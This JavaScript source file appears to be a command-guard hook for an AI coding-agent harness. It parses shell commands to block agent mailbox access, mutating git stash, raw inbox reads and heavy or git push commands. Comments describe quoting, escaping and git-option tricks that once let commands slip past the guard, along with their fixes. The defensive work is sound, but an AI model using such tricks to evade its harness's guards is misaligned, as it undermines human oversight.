// MUST match ONLY its own literal subcommand, never `message-count`/`create`/
// `list`/`check-merge`/`merge`.
function detectHivectlMessageSend(command, depth) {
  if (typeof command !== 'string' || !command.trim()) return null;
  const d = typeof depth === 'number' ? depth : 0;
  for (const seg of splitSegments(command)) {
    const dequoted = dequoteSegment(seg);
    if (T.devswarmVerbs.has(effectiveVerb(dequoted)) && !hivectlSegmentHasHelpFlag(seg)) {
      if (T.hcMessageChild.test(dequoted)) return 'message-child';
      if (T.hcMessageParent.test(dequoted)) return 'message-parent';
    }
    if (d < T.maxDepth) {
      const payload = extractShellCPayload(seg);
      if (payload) {
        const inner = detectHivectlMessageSend(payload, d + 1);
        if (inner) return inner;
      }
      const evalPayload = extractEvalPayload(seg);
      if (evalPayload) {
        const inner = detectHivectlMessageSend(evalPayload, d + 1);
        if (inner) return inner;
      }
    }
  }
  if (d < T.maxDepth) {
    for (const inner of extractSubstitutions(command)) {
      const r = detectHivectlMessageSend(inner, d + 1);
      if (r) return r;
    }
  }
  return null;
}

function mailboxTouchInSegment(dequoted) {
  if (T.mbMailbox.test(dequoted)) return true;
  if (T.mbInbox.test(dequoted) && T.ackFlag.test(dequoted)) return true;
  if (T.mbMesh.test(dequoted) && !T.meshSafe.test(dequoted)) return true;
  if (T.mbRoster.test(dequoted) && T.rosterAck.test(dequoted)) return true;
  return false;
}

function detectSubagentMailboxTouch(command, depth) {
  if (typeof command !== 'string' || !command.trim()) return false;
  const d = typeof depth === 'number' ? depth : 0;
  for (const seg of splitSegments(command)) {
    const dequoted = dequoteSegment(seg);
    if (mailboxTouchInSegment(dequoted)) return true;
    if (d < T.maxDepth) {
      const payload = extractShellCPayload(seg);
      if (payload && detectSubagentMailboxTouch(payload, d + 1)) return true;
      const evalPayload = extractEvalPayload(seg);
      if (evalPayload && detectSubagentMailboxTouch(evalPayload, d + 1)) return true;
    }
  }
  if (d < T.maxDepth) {
    for (const inner of extractSubstitutions(command)) {
      if (detectSubagentMailboxTouch(inner, d + 1)) return true;
    }
  }
  return false;
}
function buildSubagentMailboxReason() {
  return bm().blockMessage({
    guard: ah.cfg('command.msg_mailbox_guard'),
    what: ah.cfg('command.msg_mailbox_what'),
    why: ah.cfg('command.msg_mailbox_why'),
    instead: ah.cfg('command.msg_mailbox_instead'),
    allowed: ah.cfg('command.msg_mailbox_allowed'),
    override: ah.cfg('command.msg_mailbox_override'),
  });
}

function mutatingGitStashInSegment(seg) {
  if (effectiveVerb(seg) !== 'git') return null;
  const tokens = tokenizeQuoted(seg);
  let idx = 0;
  while (idx < tokens.length && basename(tokens[idx]).toLowerCase() !== 'git') idx++;
  if (idx >= tokens.length) return null;
  idx++; // skip the `git` token itself
  // Walk git's own GLOBAL options (before the subcommand) — `-C <path>`,
  // `--git-dir[=path]`, `-c <key>=<val>`, flag-only globals (`--no-pager`,
  // `--bare`, ...). Any unrecognized `-`-prefixed token is consumed as a
  // single (flag-only) token — a global option this file does not know about
  // can only cause a FALSE NEGATIVE here (miss a stash call), never a false
  // positive, which is the safe failure direction for a blocking guard.
  while (idx < tokens.length) {
    const tok = tokens[idx];
    if (tok === '--') { idx++; break; }
    if (!tok.startsWith('-')) break;
    if (RX25.test(tok)) { idx++; continue; }
    if (T.stashGlobalValue.has(tok)) {
      idx++;
      if (idx < tokens.length) idx++;
      continue;
    }
    idx++;
  }
  if (idx >= tokens.length || tokens[idx].toLowerCase() !== 'stash') return null;
  idx++; // skip the `stash` token itself
  // Walk `stash`'s own flags. A flag-only form (no subcommand word at all)
  // is git's own `push` shorthand — see T.stashPushValue / the header
  // comment's item 1.
  while (idx < tokens.length) {
    const tok = tokens[idx];
    if (!tok.startsWith('-')) break;
    if (RX26.test(tok)) { idx++; continue; }
    if (T.stashPushValue.has(tok)) {
      idx++;
      if (idx < tokens.length) idx++;
      continue;
    }
    idx++;
  }
  if (idx >= tokens.length) return 'push';
  const sub = tokens[idx].toLowerCase();
  if (T.stashReadSubs.has(sub)) return null;
  return T.stashMutatingSubs.has(sub) ? sub : null;
}
function detectMutatingGitStash(command, depth) {
  if (typeof command !== 'string' || !command.trim()) return null;
  const d = typeof depth === 'number' ? depth : 0;
  for (const seg of splitSegments(command)) {
    const hit = mutatingGitStashInSegment(seg);
    if (hit) return hit;
    if (d < T.maxDepth) {
      const shellCPayload = extractShellCPayload(seg);
      if (shellCPayload) {
        const r = detectMutatingGitStash(shellCPayload, d + 1);
        if (r) return r;
      }
      const evalPayload = extractEvalPayload(seg);
      if (evalPayload) {
        const r = detectMutatingGitStash(evalPayload, d + 1);
        if (r) return r;
      }
    }
  }
  if (d < T.maxDepth) {
    for (const inner of extractSubstitutions(command)) {
      const r = detectMutatingGitStash(inner, d + 1);
      if (r) return r;
    }
  }
  return null;
}
// findGitToplevelForStashGuard used to live here as its own PURE fs walk-up
// (no git spawn) — Phase 2 mesh redesign, B3: retired in favor of the one
// canonical resolver (companion/lib/identity.js's resolveContext), which is
// the same zero-spawn-first walk. `ctx.toplevel`, not `worktreeRoot`, is the
// right field here: a stash acts on the nearest repo actually checked out at
// cwd (a submodule included), not its superproject.
// hasProtectedStashesMarker(cwd) -> bool. The repo opts INTO stash protection
// by creating `.anti-hall/protected-stashes` at its git toplevel (any
// content, existence-only check) — this marker (or the ANTIHALL_STASH_GUARD=1
// env opt-in, see the call site) is how a repo/operator ARMS the guard; a
// repo that has never heard of it stays fully unaffected (R2 Critic P1 —
// "no unconditional default block in a public plugin").
function hasProtectedStashesMarker(cwd) {
  try {
    const top = require('../companion/lib/identity.js').resolveContext(cwd || process.cwd(), { missingPath: 'ancestor' }).toplevel;
    if (!top) return false;
    fs.statSync(path.join(top, ah.cfg('command.stash_marker_rel')));
    return true;
  } catch (_) {
    return false;
  }
}
// buildGitStashReason(sub, subagent) -> closed-vocabulary block reason (NEVER
// reflects command/stdin text). `sub` is drawn from a fixed, code-defined set
// (see mutatingGitStashInSegment), never raw input.
function buildGitStashReason(sub, subagent) {
  const scope = ah.cfg(subagent ? 'command.msg_stash_scope_subagent' : 'command.msg_stash_scope_armed');
  return bm().blockMessage({
    guard: ah.cfg('command.stash_guard'),
    what: text.render(ah.cfg('command.msg_stash_what'), { sub, scope }),
    why: ah.cfg('command.msg_stash_why'),
    instead: ah.cfg('command.msg_stash_instead'),
    allowed: ah.cfg('command.msg_stash_allowed'),
  });
}

// buildDevswarmSendReason(kind) -> closed-vocabulary block reason (NEVER reflects
// command/stdin text — injection hygiene). Redirects to the mesh CLI verbs from
// PLAN.md's CLI VERB CONTRACT: `send --to-primary|--to <meshId>` to direct-
// message, `heartbeat <id> --summary "<text>"` to report status.
function buildDevswarmSendReason(kind) {
  return bm().blockMessage({
    guard: ah.cfg('command.msg_send_guard'),
    what: text.render(ah.cfg('command.msg_send_what'), { kind }),
    why: ah.cfg('command.msg_send_why'),
    instead: ah.cfg('command.msg_send_instead'),
    override: ah.cfg('command.msg_send_override'),
  });
}

// detectProtectedFileRead(command, home, cwd, depth) -> 'deny-inbox' | 'deny-store' | null.
// Parallels detectHivectlDestructiveRead: the SAME effectiveVerb command-position
// anchoring (computed on the RAW segment, as effectiveVerb always does), and the
// SAME recursion into bash -c / eval / $()/backtick payloads. For a read verb, its
// path args are recovered via tokenizeQuoted (quote delimiters stripped, content
// kept — so a bare, double-quoted, OR single-quoted path all yield the identical
// path string) and classified via the shared devswarm-inbox-paths module; the
// FIRST arg resolving to a deny path wins.
//   - This does NOT over-block quoted DATA: `echo "…/inbox/x"` never reaches here
//     because echo is not a read verb. For grep/sed/awk (T.patternFirstVerbs), the
//     first non-flag operand is the PATTERN/script and is SKIPPED — never
//     classified — regardless of quoting or content, so `grep 'inbox' docs/KB.md`
//     and even `grep '<the literal inbox path>' docs/KB.md` stay ALLOW; only a
//     trailing FILE operand (e.g. `grep pattern <realInboxPath>`) can classify deny.
// Fully fail-open: any throw / unavailable classifier -> null (never block).
function detectProtectedFileRead(command, home, cwd, depth) {
  if (typeof command !== 'string' || !command.trim()) return null;
  const d = typeof depth === 'number' ? depth : 0;
  let classify;
  try {
    classify = require('./lib/devswarm-inbox-paths.js').classifyDevswarmPath;
  } catch (_) {
    return null; // classifier unavailable -> fail-open
  }
  for (const seg of splitSegments(command)) {
    const verb = effectiveVerb(seg);
    if (verb && T.fileReadVerbs.has(verb)) {
      const tokens = tokenizeQuoted(seg);
      let idx = 0;
      while (idx < tokens.length && basename(tokens[idx]).toLowerCase() !== verb) idx++;
      idx++; // skip the verb token itself
      // grep/sed/awk: the first non-flag operand is a PATTERN/script, not a path —
      // skip it once before classifying any further operands as files.
      let skipNextOperand = T.patternFirstVerbs.has(verb);
      for (; idx < tokens.length; idx++) {
        const tok = tokens[idx];
        if (!tok || tok.startsWith('-')) continue; // skip flags / empties
        if (skipNextOperand) { skipNextOperand = false; continue; }
        let v = 'allow';
        try { v = classify(tok, home, cwd); } catch (_) { v = 'allow'; }
        if (v === 'deny-inbox' || v === 'deny-store') return v;
      }
    }
    if (d < T.maxDepth) {
      const payload = extractShellCPayload(seg);
      if (payload) {
        const inner = detectProtectedFileRead(payload, home, cwd, d + 1);
        if (inner) return inner;
      }
      const evalPayload = extractEvalPayload(seg);
      if (evalPayload) {
        const inner = detectProtectedFileRead(evalPayload, home, cwd, d + 1);
        if (inner) return inner;
      }
    }
  }
  if (d < T.maxDepth) {
    for (const inner of extractSubstitutions(command)) {
      const r = detectProtectedFileRead(inner, home, cwd, d + 1);
      if (r) return r;
    }
  }
  return null;
}

// buildRawFileReadReason(kind) -> closed-vocabulary block reason for a raw shell
// read (cat/head/…) of the inbox/store. Uses the ACCURATE harm model (cursor
// desync + store-layering violation — NOT "drains the queue", which is false for
// the append-only inbox). NEVER echoes the path (injection hygiene).
function buildRawFileReadReason(kind) {
  // a raw store file needs the store module's presence check, which the engine does not make (classifyDevswarmPath defers it)
  if (kind !== 'deny-inbox') unsure();
  return bm().blockMessage({
    guard: ah.cfg('command.msg_rawread_inbox_guard'),
    what: ah.cfg('command.msg_rawread_inbox_what'),
    why: ah.cfg('command.msg_rawread_inbox_why'),
    instead: ah.cfg('command.msg_rawread_inbox_instead'),
    override: ah.cfg('command.msg_rawread_override'),
  });
}

// buildDevswarmReason(kind, env) -> closed-vocabulary block reason. NEVER reflects
// command/stdin text (injection hygiene). Names ANTIHALL_DEVSWARM_INBOX_CMD (the
// var, not its value) as the read path when configured; always includes the
// do-not-delegate line, the wrapper redirect (`devswarm.js inbox pull`/`read`), and
// the DISABLE_ANTIHALL_DEVSWARM=1 kill-switch; for read-messages, states that
// message-count reflects the NATIVE queue only (a 0 there does NOT mean no pending
// messages under a durable inbox). References no wrapper/CLI that does not exist.
function buildDevswarmReason(kind, env) {
  let inboxCmd;
  try { inboxCmd = require('./lib/settings.js').getWithEnv('devswarm', 'inboxCmd', ''); }
  catch (e) { if (cmdFatal(e)) throw e; inboxCmd = process.env[ah.cfg('command.inbox_cmd_setting').env]; }
  const hasInboxCmd = typeof inboxCmd === 'string' && inboxCmd.trim() !== '';
  const instead = (hasInboxCmd ? ah.cfg('command.msg_dsread_inbox_cmd_prefix') : '') + ah.cfg('command.msg_dsread_instead');
  const override = ah.cfg('command.msg_dsread_override');
  if (kind === 'monitor') {
    return bm().blockMessage({
      guard: ah.cfg('command.dsread_guard'),
      what: ah.cfg('command.msg_dsread_monitor_what'),
      why: ah.cfg('command.msg_dsread_monitor_why'),
      instead,
      override,
    });
  }
  return bm().blockMessage({
    guard: ah.cfg('command.dsread_guard'),
    what: ah.cfg('command.msg_dsread_rm_what'),
    why: ah.cfg('command.msg_dsread_rm_why'),
    instead,
    allowed: ah.cfg('command.msg_dsread_rm_allowed'),
    override,
  });
}

// Heredoc handling (opener kept, body skipped) fixes the confirmed root cause
// of P2 fp dd88d2a72562/b183a9f1bbd5: without heredoc awareness, a heredoc
// BODY's own newlines are ordinary segment-split points (see the `\n` case
// below), so a message body written as `devswarm.js send ... <<'EOF' ... EOF`
// gets each body LINE parsed as its own command segment. A body line that
// happens to START with a heavy word ("make progress on X") then has
// effectiveVerb === 'make' (a HEAVY_VERB) and is misclassified as an executed
// command, not prose. The fix: keep the heredoc OPENER text (e.g. `<<'EOF'`)
// in the invoking segment so that command's own verb is still classified
// normally, but SKIP the heredoc BODY entirely — it is DATA, never re-parsed
// as segments/commands. HEREDOC_RE/parseHeredocAt live in ./lib/shell-scan.js
// (shared with git-guard.js — see that file's SCOPE DISCIPLINE note for why
// only the low-level heredoc-construct parser is shared, not segmentation
// itself).

// Split a full command line into logical segments on the shell operators
// ; && || | (and newlines), honoring single/double quotes so an operator inside
// a quoted string does not create a spurious segment. Mirrors git-guard.js's
// splitter (kept self-contained — hooks are standalone scripts). This is what
// makes per-segment heuristics work: `cd app && npm test` is two segments, and
// `npm test` is correctly seen as heavy even though the FIRST verb is `cd`.
// splitSegmentsDetailed(cmd) -> { segments, delims }. Same single scan as
// splitSegments (below, now a thin wrapper around this) — NOT a second
// parser: it is the identical character-by-character walk, only additionally
// recording WHICH delimiter terminated each segment (delims[i] is what
// followed segments[i] — '|', '&&', '||', ';', '&', '\n', 'heredoc', 'group',
// 'subst', or 'end'). The narrow-allow bounded-verification check (below)
// needs this to tell a real `<check> | tail` PIPE from a merely-adjacent
// `<check> ; tail` sequence, which splitSegments' plain string array cannot
// distinguish. segments/delims stay 1:1 and in the same order splitSegments
// has always produced.
function splitSegmentsDetailed(cmd) {
  return cmdMemo('split:' + cmd, function () { return splitSegmentsDetailedRaw(cmd); });
}
function splitSegmentsDetailedRaw(cmd) {
  const segments = [];
  const delims = [];
  let cur = '';
  let i = 0;
  const n = cmd.length;
  let inSingle = false;
  let inDouble = false;
  // Shell-comment tracking. `nest` holds the open `(`/`{` (incl. `$(`, `$((`,
  // `${`) and `inTick` backtick state; `escEnd` is the index just past the
  // last backslash escape / line continuation (so `\ #` or `a\<nl>#` is
  // mid-word, not a comment).
  const nest = [];
  let inTick = false;
  let escEnd = -1;

  function flush(delim) {
    if (cur.trim().length) { segments.push(cur); delims.push(delim); }
    cur = '';
  }

  let heredoc = null; // the pending heredoc whose body starts after its opener line

  while (i < n) {
    if (heredoc && i >= heredoc.lineEnd) {
      // End of the opener line: the heredoc closes the logical command.
      flush('heredoc');
      i = Math.max(i, heredoc.end);
      heredoc = null;
      inSingle = false;
      inDouble = false;
      continue;
    }
    const c = cmd[i];
    const c2 = i + 1 < n ? cmd[i + 1] : '';

    if (inSingle) { cur += c; if (c === "'") inSingle = false; i++; continue; }
    if (inDouble) {
      if (c === '\\' && c2) { cur += c + c2; i += 2; continue; }
      cur += c; if (c === '"') inDouble = false; i++; continue;
    }
    // ANSI-C `$'…'`: unlike plain '…', a backslash escapes the next char, so
    // `\'` does NOT close it. Reading it as plain '…' closed early at `\'`
    // and re-opened at the real closer, hiding `; go build` inside a fake
    // quoted span (`$'a\' # '; go build`).
    if (c === '$' && c2 === "'") {
      let j = i + 2;
      while (j < n && cmd[j] !== "'") j += cmd[j] === '\\' ? 2 : 1;
      j = Math.min(j + 1, n);
      cur += cmd.slice(i, j); i = j; continue;
    }
    if (c === "'") { inSingle = true; cur += c; i++; continue; }
    if (c === '"') { inDouble = true; cur += c; i++; continue; }

    // Line continuation: backslash-newline joins lines.
    if (c === '\\' && (c2 === '\n' || (c2 === '\r' && cmd[i + 2] === '\n'))) {
      cur += ' '; i += (c2 === '\r') ? 3 : 2; escEnd = i; continue;
    }
    // Outside quotes a backslash escapes the NEXT character: `\"`/`\'` are
    // literal quote chars (no quote state change) and `\;`/`\|`/`\&` are
    // literal, not operators — exactly as bash reads them. Without this,
    // `git commit -m \" ; npm test ; echo \"` looked like ONE quoted arg to
    // the splitter while bash runs `npm test` as its own command.
    if (c === '\\' && c2) { cur += c + c2; i += 2; escEnd = i; continue; }

    // Shell comment: an unquoted `#` that STARTS A WORD (start of input, or
    // right after unescaped whitespace or `;` `&` `|`) runs to the next newline
    // and is never executed — drop it so its text (`# 1) go to x`) is not
    // split into bogus segments. Recognized ONLY at nesting depth 0 and outside
    // backticks: inside `${x:- #}`, `(( 2 #))` and backticks bash does NOT
    // treat `#` as a comment past the closer (verified), so stripping there
    // could hide a real command; staying literal is the strict fallback. `)`
    // is deliberately not a word start (`$(echo a)#b` is the word `a#b`).
    // Mid-word `#` (`a#b`, `$#`, `${#x}`, `x=#`) stays code. The newline that
    // ends the comment is left for the normal `\n` split below.
    if (c === '#' && !nest.length && !inTick && escEnd !== i &&
        (i === 0 || RX27.test(cmd[i - 1]))) {
      const nl = cmd.indexOf('\n', i);
      i = nl === -1 ? n : nl;
      continue;
    }

    // Heredoc: the operator word stays on the current segment and the rest of
    // the opener line is split as usual (`cat <<EOF | git commit -F -` is two
    // segments); at that line's newline the BODY (up to and including the
    // terminator line) is skipped without emitting segments. A second `<<` on
    // the same line is left as text (its body is not skipped: stricter).
    if (c === '<' && c2 === '<' && !heredoc) {
      const parsed = parseHeredocAt(cmd, i);
      if (parsed) {
        cur += cmd.slice(i, parsed.openerEnd);
        i = parsed.openerEnd;
        if (parsed.lineEnd !== undefined) heredoc = parsed;
        continue;
      }
    }

    if (c === '&' && c2 === '&') { flush('&&'); i += 2; continue; }
    if (c === '|' && c2 === '|') { flush('||'); i += 2; continue; }
    if (c === '|') { flush('|'); i++; continue; }
    if (c === ';') { flush(';'); i++; continue; }
    // A redirection `&` is NOT a background separator: fd-dup `2>&1` / `>&2` /
    // `<&3` (unescaped `>`/`<` right before) and `&>file` / `&>>file`. Treating
    // it as `&` split `x 2>&1 | tail` into `x 2>` / `1 | tail`, losing the pipe.
    // `escEnd !== i` keeps `\>&` (literal `>` then a real `&`) a separator.
    if (c === '&' && ((escEnd !== i && (cmd[i - 1] === '>' || cmd[i - 1] === '<')) || c2 === '>')) {
      cur += c; i++; continue;
    }
    if (c === '&') { flush('&'); i++; continue; }
    if (c === '\n') { flush('\n'); i++; continue; }
    // Subshell / grouping / command-substitution boundaries -> segment splits.
    if (c === ')' || c === '(' || c === '{' || c === '}') {
      if (c === '(' || c === '{') nest.push(c);
      else if (nest.length && nest[nest.length - 1] === (c === ')' ? '(' : '{')) nest.pop();
      flush('group'); i++; continue;
    }
    if (c === '$' && c2 === '(') { nest.push('('); flush('subst'); i += 2; continue; }
    if (c === '`') { inTick = !inTick; flush('subst'); i++; continue; }
    // `$[ … ]` (legacy arithmetic) is a nesting context too: a `#` inside it
    // is not a comment, so it must not be stripped as one.
    if (c === '$' && c2 === '[') { nest.push('['); cur += '$['; i += 2; continue; }
    if (c === '[' && nest.length && nest[nest.length - 1] === '[') nest.push('[');
    else if (c === ']' && nest.length && nest[nest.length - 1] === '[') nest.pop();

    cur += c;
    i++;
  }
  flush('end');
  return { segments, delims };
}

// Split a full command line into logical segments on the shell operators
// ; && || | (and newlines), honoring single/double quotes so an operator inside
// a quoted string does not create a spurious segment. Mirrors git-guard.js's
// splitter (kept self-contained — hooks are standalone scripts). This is what
// makes per-segment heuristics work: `cd app && npm test` is two segments, and
// `npm test` is correctly seen as heavy even though the FIRST verb is `cd`.
function splitSegments(cmd) {
  return splitSegmentsDetailed(cmd).segments;
}

// basename() is imported from ./lib/shell-scan.js (shared with git-guard.js).

// Find the effective command verb of one segment: skip leading VAR=value
// assignment prefixes and wrapper words (command/builtin/exec/sudo/env/...).
// Returns the lowercased cross-platform basename of the verb, or '' if none.
function effectiveVerb(segment) {
  return cmdMemo('verb:' + segment, function () { return effectiveVerbRaw(segment); });
}
function effectiveVerbRaw(segment) {
  const tokens = segment.trim().split(RX28).filter(Boolean);
  let idx = 0;
  // Skip leading VAR=value assignments (FOO=1 docker build .).
  while (idx < tokens.length && RX29.test(tokens[idx])) idx++;
  // Skip wrapper words; for env/timeout/nice, skip their leading operands too so
  // the wrapped verb is found (e.g. `timeout 5 npm test` -> npm).
  while (idx < tokens.length) {
    const word = basename(tokens[idx]).toLowerCase();
    if (!T.wrappers.has(word)) break;
    idx++;
    if (word === 'sudo') {
      // sudo [-flags [value]] command...   Skip option flags so
      // `sudo -u deploy npm install` resolves to `npm`, not `-u`.
      const SUDO_VAL = new Set(['-u', '-g', '-p', '-C', '-r', '-t', '-U', '-h',
        '--user', '--group', '--prompt', '--close-from', '--role', '--type',
        '--other-user', '--host']);
      while (idx < tokens.length && tokens[idx].startsWith('-')) {
        const f = tokens[idx]; idx++;
        if (f === '--') break;
        if (SUDO_VAL.has(f) && idx < tokens.length && !tokens[idx].startsWith('-')) idx++;
      }
    } else if (word === 'env') {
      while (idx < tokens.length &&
             (RX29.test(tokens[idx]) || tokens[idx].startsWith('-'))) idx++;
    } else if (word === 'timeout') {
      while (idx < tokens.length && tokens[idx].startsWith('-')) {
        const f = tokens[idx]; idx++;
        if ((f === '-s' || f === '--signal' || f === '-k' || f === '--kill-after') &&
            idx < tokens.length && !tokens[idx].startsWith('-')) idx++;
      }
      if (idx < tokens.length) idx++; // DURATION operand
    } else if (word === 'nice') {
      while (idx < tokens.length && tokens[idx].startsWith('-')) {
        const f = tokens[idx]; idx++;
        if ((f === '-n' || f === '--adjustment') &&
            idx < tokens.length && !tokens[idx].startsWith('-')) idx++;
      }
    } else if (word === 'taskpolicy') {
      // taskpolicy [-c class] [-b|-B] [-t class] [-p pid] ... command. Skip
      // option flags, consuming a separated value for -c/-t (the class arg).
      while (idx < tokens.length && tokens[idx].startsWith('-')) {
        const f = tokens[idx]; idx++;
        if ((f === '-c' || f === '-t' || f === '-p') &&
            idx < tokens.length && !tokens[idx].startsWith('-')) idx++;
      }
    } else if (word === 'xargs') {
      // xargs [-n N] [-I repl] [-P N] ... command. Best-effort: skip leading
      // flag tokens so the wrapped runner (e.g. `xargs pytest`) is found.
      while (idx < tokens.length && tokens[idx].startsWith('-')) idx++;
    }
  }
  if (idx >= tokens.length) return '';
  // Strip Windows/Unix path separators on the verb (/usr/bin/npm, \git -> npm/git).
  return basename(tokens[idx]).toLowerCase();
}

// Neutralize the CONTENTS of single- and double-quoted string literals in a
// segment, replacing each quoted char with a space so a HEAVY_PATTERN cannot
// match text that is merely a quoted DATA argument (e.g. `echo "npm run build"`).
// The quote delimiters themselves are also turned into spaces; unquoted text is
// left intact so a real unquoted `npm run build` still matches. This is used FOR
// THE PATTERN TEST ONLY — the effective-verb check and the $(...)/backtick/`-c`/
// `eval` extraction all run against the ORIGINAL segment, so command
// substitutions and shell payloads are still extracted and recursed BEFORE this
// neutralization can affect anything (extraction order preserved).
function neutralizeQuotedContents(segment) {
  return cmdMemo('neut:' + segment, function () { return neutralizeQuotedContentsRaw(segment); });
}
function neutralizeQuotedContentsRaw(segment) {
  let out = '';
  let i = 0;
  const n = segment.length;
  let inSingle = false;
  let inDouble = false;
  while (i < n) {
    const c = segment[i];
    const c2 = i + 1 < n ? segment[i + 1] : '';
    if (inSingle) { out += ' '; if (c === "'") inSingle = false; i++; continue; }
    if (inDouble) {
      if (c === '\\' && c2) { out += '  '; i += 2; continue; }
      out += ' '; if (c === '"') inDouble = false; i++; continue;
    }
    // Outside quotes, `\x` is a literal x (no quote state change) — keep it.
    if (c === '\\' && c2) { out += c + c2; i += 2; continue; }
    if (c === "'") { inSingle = true; out += ' '; i++; continue; }
    if (c === '"') { inDouble = true; out += ' '; i++; continue; }
    out += c; i++;
  }
  return out;
}

// blankPatternArgument(text, verb): for a grep/sed/awk (T.patternFirstVerbs)
// segment, its FIRST non-flag operand is a search PATTERN/script — DATA, not
// a command — so blank it (replace with spaces, preserving length/offsets)
// before running T.heavyPatterns against the text. Fixes P2 fp b183a9f1bbd5:
// `git show <ref>:<path> | grep deploy` was misread as an executed "deploy"
// command because the pattern argument's own text was scanned like command
// text. Mirrors detectProtectedFileRead's skipNextOperand discipline (best-
// effort: does not special-case a SEPARATED flag value, e.g. `-A 5`, where
// the numeric operand would itself be (wrongly) treated as the pattern and
// blanked instead — same accepted limitation as the existing skipNextOperand
// logic above, not a new gap). Only ever narrows what is blanked (i.e. only
// ever ALLOWS more), never widens a block.
function blankPatternArgument(text, verb) {
  if (!verb || !T.patternFirstVerbs.has(verb)) return text;
  const tokenRe = /\S+/g;
  let m;
  let foundVerb = false;
  while ((m = tokenRe.exec(text))) {
    const tok = m[0];
    if (!foundVerb) {
      if (basename(tok).toLowerCase() === verb) foundVerb = true;
      continue;
    }
    if (tok.startsWith('-')) continue; // flag: skip, keep scanning for the pattern
    // First non-flag operand after the verb is the PATTERN/script -> blank it.
    const start = m.index;
    const end = start + tok.length;
    return text.slice(0, start) + ' '.repeat(tok.length) + text.slice(end);
  }
  return text;
}

function isSafeNodeEvalPayload(payload) {
  if (!payload) return false;
  for (const re of T.nodeEvalDeny) if (re.test(payload)) return false;
  T.nodeFsCall.lastIndex = 0;
  let m;
  while ((m = T.nodeFsCall.exec(payload))) {
    if (!T.nodeFsRead.has(m[1])) return false;
  }
  return true;
}

function isSafeNodeEval(segment) {
  if (effectiveVerb(segment) !== 'node') return false;
  const tokens = tokenizeQuoted(segment);
  for (let i = 0; i < tokens.length; i++) {
    if (T.nodeEvalFlags.has(tokens[i])) {
      const payload = i + 1 < tokens.length ? tokens[i + 1] : '';
      return isSafeNodeEvalPayload(payload);
    }
  }
  return false;
}

// isNodeDashEInvocation(segment) -> true iff this segment is a `node -e`/
// `node --eval` invocation (regardless of payload safety). Root-cause fix:
// `node` is NOT in T.heavyVerbs and `node -e "..."` never matches the
// `\bnode\s+\S+\.(?:js|mjs|cjs)\b` HEAVY_PATTERN (there is no script FILE
// argument), so isSafeNodeEval()/isSafeNodeEvalPayload() above were
// previously dead code as far as isHeavySegment's BLOCK decision goes —
// an unsafe `-e` payload never got flagged heavy in the first place,
// regardless of what isSafeNodeEval returned. isHeavySegment now calls this
// after the isSafeNodeEval(segment) exemption check, so: safe payload ->
// exempted (returns false further up); unsafe/unknown payload -> this
// returns true -> BLOCKED.
function isNodeDashEInvocation(segment) {
  if (effectiveVerb(segment) !== 'node') return false;
  const tokens = tokenizeQuoted(segment);
  for (let i = 0; i < tokens.length; i++) {
    if (T.nodeEvalFlags.has(tokens[i])) return true;
  }
  return false;
}

// gitSubcommandIndex(tokens, gitIdx) -> index of the REAL git subcommand
// token (push/fetch/status/...), skipping any global options between `git`
// and the subcommand. Returns -1 if none is found. A value-taking global
// option (`-c`, `-C`, ...) consumes one extra token UNLESS its value is
// attached via `=` (`--git-dir=/x`). An unrecognized `-`-prefixed token
// before the subcommand is conservatively skipped by exactly one token too
// — git's own grammar never allows a subcommand-specific flag to appear
// before the subcommand name, so any leading `-` token here IS necessarily
// a global option, known or not.
function gitSubcommandIndex(tokens, gitIdx) {
  let idx = gitIdx + 1;
  while (idx < tokens.length) {
    const t = tokens[idx];
    if (!t.startsWith('-')) return idx;
    const eq = t.indexOf('=');
    const base = eq === -1 ? t : t.slice(0, eq);
    if (T.gitGlobalValue.has(base)) { idx += (eq === -1) ? 2 : 1; continue; }
    if (T.gitGlobalFlag.has(t)) { idx++; continue; }
    idx++; // unknown global flag: skip just this one token (fail-safe)
  }
  return -1;
}

function isSafeGitFetch(segment) {
  if (effectiveVerb(segment) !== 'git') return false;
  const tokens = tokenizeQuoted(segment);
  const gitIdx = tokens.findIndex((t) => basename(t).toLowerCase() === 'git');
  if (gitIdx === -1) return false;
  const subIdx = gitSubcommandIndex(tokens, gitIdx);
  if (subIdx === -1 || (tokens[subIdx] || '').toLowerCase() !== 'fetch') return false;
  for (let i = subIdx + 1; i < tokens.length; i++) {
    const t = tokens[i];
    if (T.fetchDangerous.has(t)) return false;
    if (t.startsWith('+')) return false;
    if (t.includes(':')) return false;
  }
  return true;
}

// isHeavyGitSegment(segment) -> true iff this segment's git invocation has a
// REAL subcommand (found via gitSubcommandIndex, so a global option in
// between `git` and the subcommand cannot hide it) of push/pull/clone
// (always heavy) or fetch without isSafeGitFetch's safety. This is the fix
// for the P1 bypass above: the plain-substring git HEAVY_PATTERN
// (`\bgit\s+(?:push|pull|fetch|clone)\b`) only matches when the subcommand
// is textually ADJACENT to `git`, so it never even sees a global-option-
// prefixed invocation — this check runs the same tokenized, option-aware
// parse used by isSafeGitFetch, so the two can never disagree about where
// the subcommand actually is. Gated on effectiveVerb(segment) === 'git'
// first (same discipline as isSafeGitFetch/isSafeSqliteReadonly/
// isSafeNodeEval below) so `git` appearing only as quoted DATA in an
// unrelated command (`echo "git push origin"`) is never misread as a real
// git invocation.
function isHeavyGitSegment(segment) {
  if (effectiveVerb(segment) !== 'git') return false;
  const tokens = tokenizeQuoted(segment);
  const gitIdx = tokens.findIndex((t) => basename(t).toLowerCase() === 'git');
  if (gitIdx === -1) return false;
  const subIdx = gitSubcommandIndex(tokens, gitIdx);
  if (subIdx === -1) return false;
  const sub = tokens[subIdx].toLowerCase();
  if (sub === 'push' || sub === 'pull' || sub === 'clone') return true;
  if (sub === 'fetch') return !isSafeGitFetch(segment);
  return false;
}

// isGitPushSegment(segment) -> true iff the real git subcommand is `push`.
// Used only to pick the block-reason wording (state-changing, not "heavy").
function isGitPushSegment(segment) {
  if (effectiveVerb(segment) !== 'git') return false;
  const tokens = tokenizeQuoted(segment);
  const gitIdx = tokens.findIndex((t) => basename(t).toLowerCase() === 'git');
  if (gitIdx === -1) return false;
  const subIdx = gitSubcommandIndex(tokens, gitIdx);
  return subIdx !== -1 && T.classifyPushSubs.has(tokens[subIdx].toLowerCase());
}

// isGitPullFetchSegment(segment) -> true for `git pull` / `git fetch` (they move
// refs/objects from a remote). Used ONLY to word the block reason; verdicts are
// unchanged (T.heavyPatterns already flags both).
function isGitPullFetchSegment(segment) {
  if (effectiveVerb(segment) !== 'git') return false;
  const tokens = tokenizeQuoted(segment);
  const gitIdx = tokens.findIndex((t) => basename(t).toLowerCase() === 'git');
  if (gitIdx === -1) return false;
